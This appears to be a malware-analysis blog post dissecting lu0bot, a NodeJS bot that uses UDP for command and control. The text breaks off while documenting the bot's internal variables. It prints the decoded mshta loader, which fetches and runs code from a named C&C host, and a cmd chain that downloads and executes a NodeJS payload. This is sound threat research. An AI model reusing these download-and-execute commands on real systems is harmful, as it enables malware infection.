<meta property="og:image:height" content="853" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Lu0bot &#8211; An unknown NodeJS malware using UDP" />
<meta name="twitter:image" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?resize=1200%2C853&#038;ssl=1&#038;w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=32%2C26&#038;ssl=1" sizes="32x32" />
<link rel="icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=192%2C156&#038;ssl=1" sizes="192x192" />
<link rel="apple-touch-icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=180%2C146&#038;ssl=1" />
<meta name="msapplication-TileImage" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=249%2C202&#038;ssl=1" />

</head>
<body class="post-template-default single single-post postid-3431 single-format-standard has-site-icon lu0bot-an-unknown-nodejs-malware-using-udp">
	<div class="wrapper">
		<header class="header clear" role="banner">
			<div class="container">
				<nav class="navbar navbar-expand-lg navbar-dark " role="navigation">
										<a class="navbar-brand" href="https://fumik0.com">
						<img src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=32%2C26&#038;ssl=1" alt="Logo" class="logo-img">
					</a>
					
											<div id="mynote-nav-bar" class="collapse navbar-collapse"><ul id="menu-primary" class="navbar-nav mr-auto"><li  id="menu-item-8"class="nav-item"><a href="/" class="nav-link">Home</a></li><li  id="menu-item-595"class="nav-item"><a href="http://tracker.fumik0.com" class="nav-link">Tracker</a></li><li  id="menu-item-786"class="nav-item"><a href="https://twitter.com/fumik0_" class="nav-link">Twitter</a></li><li  id="menu-item-9"class="nav-item"><a href="https://fumik0.com/about/" class="nav-link">About</a></li><li  id="menu-item-10"class="nav-item"><a href="https://fumik0.com/contact/" class="nav-link">Contact</a></li></ul></div>					
					<div class="search-bar">
						
<form id="search-form" class="search" method="get" action="https://fumik0.com" role="search" autocomplete="off">
	<input type="text" name="s" class="search-input" placeholder="To search, type and hit enter.">
	<span class="search-icon" onclick="document.getElementById('search-form').submit();"><i class="fas fa-search"></i></span>
</form>


					</div>
					
					<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#mynote-nav-bar" aria-controls="mynote-nav-bar" aria-expanded="false" aria-label="Toggle navigation">
						<span class="navbar-toggler-icon"></span>
					</button>
				</nav>
			</div><!-- .container -->
		</header>


		

		<div class="single-post-title-bar clear" role="banner">
			<div class="container">
				<nav class="navbar navbar-expand-lg navbar-dark" role="navigation">
					<a class="navbar-brand" href="https://fumik0.com"></a>
					<div id="progress-title"></div>
				</nav>
			</div>
			<div class="progress-wrapper">
				<div class="progress-label"></div>
				<progress></progress>
			</div>
		</div>
	
<div class="data-schema is-single" itemscope itemtype="http://schema.org/Article">
											<nav class="breadcrumb">
			<div class="container">
				<ul class="breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList">
					<li class="breadcrumb-item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<a href="https://fumik0.com" itemprop="item">
							<span itemprop="name"><i class="fas fa-globe"></i><span class="sr-only">Home</span></span>
						</a>
						<meta itemprop="position" content="1">
					</li>
										<li class="breadcrumb-item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<a href="https://fumik0.com/category/uncategorized/" itemprop="item">
							<span itemprop="name">Uncategorized</span>
						</a>
						<meta itemprop="position" content="2">
					</li>
															<li class="breadcrumb-item active" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<span itemprop="name">Lu0bot &#8211; An unknown NodeJS malware using UDP</span>
						<meta itemprop="item" content="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/">
						<meta itemprop="position" content="3">
					</li>
				</ul>
			</div>
		</nav>
		
			<div class="single-post-header">
				<div class="container">

					<h1 id="post-title" itemprop="headline">Lu0bot &#8211; An unknown NodeJS malware using UDP</h1>
					<div class="post-mynote-buttons">

															<div class="btn-group column-control">
			<div class="btn-counter text-only active" data-target="#aside-container" role="button">		
				<div class="btn"><i class="fas fa-columns"></i></div>
			</div>
			<div class="btn-counter text-only" data-target="#sidebar" role="button">		
				<div class="btn"><i class="fas fa-list-ul"></i></div>
			</div> 
		</div>
							
												
		<a href="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/#comments" class="button-like-link">
			<div class="btn-counter">
				<div class="btn">
					<i class="fas fa-comment-dots"></i>
				</div>
				<div class="count-box">0</div>
			</div>
		</a>
						</div><!-- .post-mynote-buttons -->

											<div class="post-meta">
							<div class="author-posted-date"><img src="https://secure.gravatar.com/avatar/60460a1a0d00b32720a59ee2624bb4aa?s=40&#038;d=identicon&#038;r=g" class="rounded-circle poster-avatar" align="middle"> <a href="https://fumik0.com/author/fumko/" title="written June 24, 2021 @ 8:37 am" class="author-link">fumko</a> <time itemprop="datePublished" datetime="2021-06-24T08:37:41+00:00">written 3 years ago</time></div>						</div>
					
				</div><!-- .container -->
			</div><!-- .single-post-header -->

			
	<div class="container">
		<div class="row row-layout-choice-post">
			<main id="main-container" class="col-lg-8 col-md-8 col-sm-12" role="main">

				
					
						
						<article id="post-3431" class="markdown-body post-3431 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">

																	<figure>
			<img src="https://fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg" class="attachment- size- wp-post-image" alt="" itemprop="image" decoding="async" fetchpriority="high" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?w=1280&amp;ssl=1 1280w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?resize=1024%2C682&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?resize=768%2C512&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?resize=1200%2C800&amp;ssl=1 1200w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?resize=360%2C240&amp;ssl=1 360w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?resize=600%2C400&amp;ssl=1 600w" sizes="(max-width: 1280px) 100vw, 1280px" data-attachment-id="3489" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/russian-dolls-606626_1280/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?fit=1280%2C853&amp;ssl=1" data-orig-size="1280,853" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="russian-dolls-606626_1280" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?fit=300%2C200&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/russian-dolls-606626_1280.jpg?fit=900%2C599&amp;ssl=1" />			<figcaption></figcaption>
		</figure>
								
							<div itemprop="articleBody">
								
<p>In February/March 2021, A curious lightweight payload has been observed from a well-known load seller platform. At the opposite of classic info-stealers being pushed at an industrial level, this one is widely different in the current landscape/trends. Feeling being in front of a grey box is somewhat a stressful problem, where you have no idea about what it could be behind and how it works, but in another way, it also means that you will learn way more than a usual standard investigation.</p>



<p>I didn&#8217;t feel like this since Qulab and at that time, this AutoIT malware gave me some headaches due to its packer. but after cleaning it and realizing it&#8217;s rudimentary, the challenge was over. In this case, analyzing NodeJS malware is definitely another approach. </p>



<p>I will just expose some current findings of it, I don&#8217;t have all answers, but at least, it will door opened for further researches.</p>



<p><i><strong><em><span style="text-decoration: underline;">Disclaimer</span></em></strong></i><em>: I don&#8217;t know the real name of this malware.</em></p>



<h2 class="wp-block-heading">Minimalist C/C++ loader</h2>



<p>When lu0bot is deployed on a machine, <strong><em>the first stage is a 2.5 ko lightweight payload</em></strong> which has only two section headers.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" decoding="async" width="900" height="169" data-attachment-id="3379" data-permalink="https://fumik0.com/stage1_sections/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/05/stage1_sections.png?fit=926%2C174&amp;ssl=1" data-orig-size="926,174" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="stage1_sections" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/05/stage1_sections.png?fit=300%2C56&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/05/stage1_sections.png?fit=900%2C169&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/05/stage1_sections.png?resize=900%2C169&#038;ssl=1" alt="" class="wp-image-3379" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/05/stage1_sections.png?w=926&amp;ssl=1 926w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/05/stage1_sections.png?resize=300%2C56&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/05/stage1_sections.png?resize=768%2C144&amp;ssl=1 768w" sizes="(max-width: 900px) 100vw, 900px" /><figcaption><em>Curious PE Sections</em></figcaption></figure></div>



<p>Written in <strong><em>C/C++</em></strong>, only one function has been developped.</p>



<pre class="wp-block-code"><code>void start()
{
  char *buff; 

  buff = CmdLine;
  do
  {
    buff -= 'NPJO';      // The key seems random after each build
    buff += 4;        
  }
  while ( v0 &lt; &amp;CmdLine&#91;424] );
  WinExec(CmdLine, 0);   // ... to the moon ! \o/
  ExitProcess(0);
}</code></pre>



<p>This rudimentary loop is focused on decrypting a buffer, unveiling then a one-line JavaScript code executed through <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec" data-type="URL" data-id="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec()</a></strong></p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" decoding="async" width="801" height="286" data-attachment-id="3378" data-permalink="https://fumik0.com/stage1_dumb_sub/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/05/Stage1_Dumb_Sub.gif?fit=801%2C286&amp;ssl=1" data-orig-size="801,286" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Stage1_Dumb_Sub" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/05/Stage1_Dumb_Sub.gif?fit=300%2C107&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/05/Stage1_Dumb_Sub.gif?fit=801%2C286&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/05/Stage1_Dumb_Sub.gif?resize=801%2C286&#038;ssl=1" alt="" class="wp-image-3378"/><figcaption><em>Simple sub loop for unveiling the next stage</em></figcaption></figure></div>



<p>Indeed, <em><strong><a href="https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5)?redirectedfrom=MSDN" data-type="URL" data-id="https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5)?redirectedfrom=MSDN">MSHTA</a></strong></em> is used executing this malicious script. So in term of monitoring, it&#8217;s easy to catch this interaction.</p>



<pre class="wp-block-code"><code>mshta "javascript: document.write();
42;
y = unescape('%312%7Eh%74t%70%3A%2F%2F%68r%692%2Ex%79z%2Fh%72i%2F%3F%321%616%654%62%7E%321%32').split('~');
103;
try {
    x = 'WinHttp';
    127;
    x = new ActiveXObject(x + '.' + x + 'Request.5.1');
    26;
    x.open('GET', y&#91;1] + '&amp;a=' + escape(window.navigator.userAgent), !1);
    192;
    x.send();
    37;
    y = 'ipt.S';
    72;
    new ActiveXObject('WScr' + y + 'hell').Run(unescape(unescape(x.responseText)), 0, !2);
    179;
} catch (e) {};
234;;
window.close();"</code></pre>



<h2 class="wp-block-heading">Setting up NodeJs</h2>



<p>Following the script from above, it is designed to perform an HTTP GET request from a C&amp;C (let&#8217;s say it&#8217;s the first C&amp;C Layer). Then the response is executed as an <strong>ActiveXObject</strong>.</p>



<pre class="wp-block-code"><code><div class="hcb_wrap">
<pre class="prism line-numbers lang-js" data-lang="JavaScript"><code>new ActiveXObject('WScr' + y + 'hell').Run(unescape(unescape(x.responseText)), 0, !2);</code></pre>
</div></code></pre>



<p>Let&#8217;s inspect the code (response) step by step</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-bash" data-lang="Bash"><code>cmd /d/s/c cd /d &quot;%ALLUSERSPROFILE%&quot; & mkdir &quot;DNTException&quot; & cd &quot;DNTException&quot; & dir /a node.exe [...]</code></pre></div>



<ul class="wp-block-list"><li>Set the console into %ALLUSERPROFILE% path</li><li>Create fake folder DNTException</li></ul>



<div class="hcb_wrap"><pre class="prism line-numbers lang-js" data-lang="JavaScript"><code>[...] || ( echo x=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;^);
           x.Open(&quot;GET&quot;,unescape(WScript.Arguments(0^)^),false^);
           x.Send(^);
           b = new ActiveXObject(&quot;ADODB.Stream&quot;^);
           b.Type=1;
           b.Open(^);
           b.Write(x.ResponseBody^);
           b.SaveToFile(WScript.Arguments(1^),2^); 
           &gt; get1618489872131.txt 
           & cscript /nologo /e:jscript get1618489872131.txt &quot;http://hri2.xyz/hri/?%HEXVALUE%&b=%HEXVALUE%&quot; node.cab 
           & expand node.cab node.exe 
           & del get1618489872131.txt node.cab 
) [...]</code></pre></div>



<ul class="wp-block-list"><li>Generate a js code-focused into downloading a saving an archive that will be named &#8220;node.cab&#8221;</li><li>Decompress the cab file with expand command and renamed it &#8220;node.exe&#8221;</li><li>Delete all files that were generated when it&#8217;s done</li></ul>



<div class="hcb_wrap"><pre class="prism line-numbers lang-js" data-lang="JavaScript"><code>[...] & echo new ActiveXObject(&quot;WScript.Shell&quot;).Run(WScript.Arguments(0),0,false); &gt; get1618489872131.txt [...]</code></pre></div>



<ul class="wp-block-list"><li>Recreate a js script that will execute again some code</li></ul>



<div class="hcb_wrap"><pre class="prism line-numbers lang-js" data-lang="JavaScript"><code>[...] cscript /nologo /e:jscript get1618489872131.txt &quot;node -e eval(FIRST_STAGE_NODEJS_CODE)&quot; & del get1618489872131.txt [...]</code></pre></div>



<p>In the end, this whole process is designed for retrieving the required <strong>NodeJS runtime</strong>.</p>



<div class="wp-block-image"><figure class="aligncenter"><img data-recalc-dims="1" loading="lazy" decoding="async" width="653" height="344" data-attachment-id="3435" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/setup/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Setup.png?fit=653%2C344&amp;ssl=1" data-orig-size="653,344" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Setup" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Setup.png?fit=300%2C158&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Setup.png?fit=653%2C344&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Setup.png?resize=653%2C344&#038;ssl=1" alt="" class="wp-image-3435" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Setup.png?w=653&amp;ssl=1 653w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Setup.png?resize=300%2C158&amp;ssl=1 300w" sizes="auto, (max-width: 653px) 100vw, 653px" /><figcaption><em>Lu0bot nodejs loader initialization process</em></figcaption></figure></div>



<h2 class="wp-block-heading">Matryoshka Doll(J)s</h2>



<p>Luckily the code is in fact pretty well written and comprehensible at this layer. It is 20~ lines of code that will build the whole malware thanks to one and simple API call: <strong><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">eval</a>.</strong></p>



<div class="wp-block-image"><figure class="aligncenter"><img data-recalc-dims="1" loading="lazy" decoding="async" width="719" height="405" data-attachment-id="3436" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/nodejs_stage1/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_stage1.png?fit=719%2C405&amp;ssl=1" data-orig-size="719,405" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nodejs_stage1" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_stage1.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_stage1.png?fit=719%2C405&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_stage1.png?resize=719%2C405&#038;ssl=1" alt="" class="wp-image-3436" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_stage1.png?w=719&amp;ssl=1 719w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_stage1.png?resize=300%2C169&amp;ssl=1 300w" sizes="auto, (max-width: 719px) 100vw, 719px" /><figcaption><em>implistic lu0bot nodejs loader that is basically the starting point for everything</em></figcaption></figure></div>



<p><br>From my own experience, I&#8217;m not usually confronted with malware using UDP protocol for communicating with C&amp;C&#8217;s. Furthermore, I don&#8217;t think in the same way, it&#8217;s usual to switch from TCP to UDP like it was nothing. When I analyzed it for the first time, I found it odd to see so many noisy interactions in the machine with just two HTTP requests. Then I realized that I was watching the visible side of a gigantic iceberg&#8230;</p>



<div class="wp-block-image"><figure class="aligncenter"><img data-recalc-dims="1" loading="lazy" decoding="async" width="486" height="476" data-attachment-id="3437" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/meme_udp/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/meme_udp.png?fit=486%2C476&amp;ssl=1" data-orig-size="486,476" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="meme_udp" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/meme_udp.png?fit=300%2C294&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/meme_udp.png?fit=486%2C476&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/meme_udp.png?resize=486%2C476&#038;ssl=1" alt="" class="wp-image-3437" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/meme_udp.png?w=486&amp;ssl=1 486w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/meme_udp.png?resize=300%2C294&amp;ssl=1 300w" sizes="auto, (max-width: 486px) 100vw, 486px" /><figcaption><em>Well played OwO</em></figcaption></figure></div>



<p>For those who are uncomfortable with <strong>NodeJS</strong>, the script is designed to sent periodically <strong>UDP</strong> requests over port <strong>19584</strong> on <strong>two specific domains</strong>. When a message is received, it is decrypted with a standard<strong> XOR decryption</strong> loop, the output is a <strong>ready-to-use code</strong> that will be <strong>executed</strong> right after with <strong><strong><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">eval</a></strong></strong>. Interestingly the first byte of the response is also part of the key, so it means that every time a response is received, it is likely dynamically different even if it&#8217;s the same one.</p>



<p>In the end, <strong>lu0bot</strong> is basically working in that way</p>



<div class="wp-block-image"><figure class="aligncenter"><img data-recalc-dims="1" loading="lazy" decoding="async" width="893" height="514" data-attachment-id="3439" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/nodejs_summarized/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_summarized.png?fit=893%2C514&amp;ssl=1" data-orig-size="893,514" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nodejs_summarized" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_summarized.png?fit=300%2C173&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_summarized.png?fit=893%2C514&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_summarized.png?resize=893%2C514&#038;ssl=1" alt="" class="wp-image-3439" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_summarized.png?w=893&amp;ssl=1 893w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_summarized.png?resize=300%2C173&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/nodejs_summarized.png?resize=768%2C442&amp;ssl=1 768w" sizes="auto, (max-width: 893px) 100vw, 893px" /><figcaption><em>lu0bot nodejs malware architecture</em></figcaption></figure></div>



<p>After digging into each code executed, It really feels that you are playing with matryoshka dolls, due to recursive <strong><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">eval</a></strong> loops unveiling more content/functions over time. It&#8217;s also the reason why this malware could be simple and complex at the same time if you aren&#8217;t experienced with this strategy.</p>



<div class="wp-block-image"><figure class="aligncenter"><img data-recalc-dims="1" loading="lazy" decoding="async" width="803" height="464" data-attachment-id="3440" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/dolls/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Dolls.png?fit=803%2C464&amp;ssl=1" data-orig-size="803,464" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Dolls" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Dolls.png?fit=300%2C173&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Dolls.png?fit=803%2C464&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Dolls.png?resize=803%2C464&#038;ssl=1" alt="" class="wp-image-3440" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Dolls.png?w=803&amp;ssl=1 803w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Dolls.png?resize=300%2C173&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/Dolls.png?resize=768%2C444&amp;ssl=1 768w" sizes="auto, (max-width: 803px) 100vw, 803px" /><figcaption><em>The madness philosophy behind eval() calls</em></figcaption></figure></div>



<p>For adding more nonsense it is using different encryption algorithms whatever during communications or storing variables content:</p>



<ul class="wp-block-list"><li>XOR</li><li>AES-128-CBC</li><li>Diffie-Hellman</li><li>Blowfish</li></ul>



<h2 class="wp-block-heading">Understanding Lu0bot variables</h2>



<h3 class="wp-block-heading">S (as Socket)</h3>



<ul class="wp-block-list"><li>Fundamental Variable</li><li>UDP communications with C&amp;C&#8217;s</li><li>Receiving main classes/variables</li><li>Executing &#8220;main branches&#8221; code</li></ul>



<pre class="wp-block-code"><code>function om1(r,q,m)      # Object Message 1
 |--&gt; r # Remote Address Information
 |--&gt; q # Query 
 |--&gt; m # Message

function c1r(m,o,d)       # Call 1 Response
 |--&gt; m # Message
 |--&gt; o # Object
 |--&gt; d # Data

function sc/c1/c2/c3(m,r) # SetupCall/Call1/Call2/Call3
 |--&gt; m # Message
 |--&gt; r # Remote Address Information

function ss(p,q,c,d)      # ScriptSetup / SocketSetup
 |--&gt; p # Personal ID
 |--&gt; q # Query 
 |--&gt; c # Crypto/Cipher
 |--&gt; d # Data

function f()              # UDP C2 communications</code></pre>



<h3 class="wp-block-heading">KO (as Key Object ?)</h3>



<ul class="wp-block-list"><li><strong>lu0bot </strong>mastermind</li><li>Containing all bot information<ul><li>C&amp;C side</li><li>Client side</li></ul></li><li>storing fundamental handle functions for task manager(s)<ul><li>eval | buffer | file</li></ul></li></ul>



<pre class="wp-block-code"><code>ko {
    pid:     # Personal ID
    aid:     # Address ID (C2)
    q:       # Query
    t:       # Timestamp
    lq: {
             # Query List
    },
    pk:      # Public Key
    k:       # Key
    mp: {},  # Module Packet/Package 
    mp_new: &#91;Function: mp_new],        # New Packet/Package in the queue
    mp_get: &#91;Function: mp_get],        # Get Packet/Package from the queue
    mp_count: &#91;Function: mp_count],    # Packer/Package Counter
    mp_loss: &#91;Function: mp_loss],      # ???
    mp_del: &#91;Function: mp_del],        # Delete Packet/Package from the queue
    mp_dtchk: &#91;Function: mp_dtchk],    # Data Check
    mp_dtsum: &#91;Function: mp_dtsum],    # Data Sum
    mp_pset: &#91;Function: mp_pset],      # Updating Packet/Package from the queue
    h: {                               # Handle
        eval: &#91;Function],              
        bufwrite: &#91;Function],
        bufread: &#91;Function],
        filewrite: &#91;Function],
        fileread: &#91;Function]
    },
    mp_opnew: &#91;Function: mp_opnew],    # Create New
    mp_opstat: &#91;Function: mp_opstat],  # get stats from MP
    mp_pget: &#91;Function],               # Get Packet/Package from MP
    mp_pget_ev: &#91;Function]             # Get Packet/Package Timer Intervals
}</code></pre>



<h3 class="wp-block-heading">MP </h3>



<ul class="wp-block-list"><li><strong>M</strong>odule <strong>P</strong>ackage/<strong>P</strong>acket/Program ?</li><li>Monitoring and logging an executed task/script. </li></ul>



<pre class="wp-block-code"><code>mp:                              
   { key:                        # Key is Personal ID
      { id:  ,                   # Key ID (Event ID)
        pid: ,                   # Personal ID
        gen:  ,                  # Starting Timestamp
        last: ,                  # Last Tick Update
        tmr: &#91;Object],           # Timer
        p: {},                   # Package/Packet
        psz:                     # Package/Packet Size
        btotal:                  # ???
